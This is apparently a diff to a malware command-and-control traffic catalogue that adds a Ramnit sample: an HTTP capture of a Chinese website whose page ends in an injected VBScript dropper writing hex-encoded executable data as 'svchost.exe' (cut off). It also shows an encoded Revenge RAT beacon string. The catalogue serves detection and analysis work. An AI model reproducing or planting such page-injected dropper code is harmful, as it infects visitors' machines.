@@ -1385,11 +1385,81 @@ true"success"
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/remcos.png "Remcos")
 
+#### Ramnit
+~~~
+GET / HTTP/1.1
+Host: www.yx-lj.com
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+HTTP/1.1 200 OK
+Content-Length: 114482
+Content-Type: text/html
+Content-Location: http://www.yx-lj.com/index.htm
+Last-Modified: Tue, 21 May 2019 01:43:35 GMT
+Accept-Ranges: bytes
+ETag: "47c7bf9a76fd51:ac9"
+Server: Microsoft-IIS/6.0
+MicrosoftOfficeWebServer: 5.0_Pub
+X-Powered-By: ASP.NET
+Date: Thu, 17 Oct 2019 18:56:31 GMT
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>..........</title>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<meta name="Keywords" content="........,................,........" />
+<meta name="Description" content="...................................................." />
+<link href="images/style.css" rel="stylesheet" type="text/css">
+<style type="text/css">
+<!--
+body {
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+	background-color: #000000;
+}
+-->
+</style>
+</head>
+
+<body>
+
+
+
+<title>..........</title>
+<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
+  <tr>
+    <td align="center" valign="middle" bgcolor="#000000"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="990" height="677">
+      <param name="movie" value="china/images/index.swf" />
+      <param name="quality" value="high" />
+      <param name="BGCOLOR" value="#000000" />
+      <embed src="china/images/index.swf" width="990" height="677" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" bgcolor="#000000"></embed>
+    </object></td>
+  </tr>
+</table>
+</body>
+</html>
+ 
+
+ 
+ 
+<SCRIPT Language=VBScript><!--
+DropFileName = "svchost.exe"
+WriteData = "4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ramnit.png "Ramnit")
+
 #### Revenge RAT
 ~~~
 InformationRevenge-RATUEVSRElSRevenge-RATX0M0QkEzNjQ3Revenge-RAT192.168.100.213Revenge-RATVVNFUi1QQyAvIGFkbWluRevenge-RATNoRevenge-RATTWljcm9zb2Z0IFdpbmRvd3MgNyBQcm9mZXNzaW9uYWwgIDMyRevenge-RATSW50ZWwoUikgQ29yZShUTSkgaTUtNjQwMCBDUFUgQCAyLjcwR0h6Revenge-RAT3757686784Revenge-RATTi9BRevenge-RATTi9BRevenge-RAT1000Revenge-RATTWljcm9zb2Z0IFBvd2VyUG9pbnQ=Revenge-RATZW4tVVM=Revenge-RATFalse*-]NK[-*
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/revenge.png "Rvenge RAT")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/revenge.png "Revenge RAT")
 
 #### RMS RAT
 ~~~
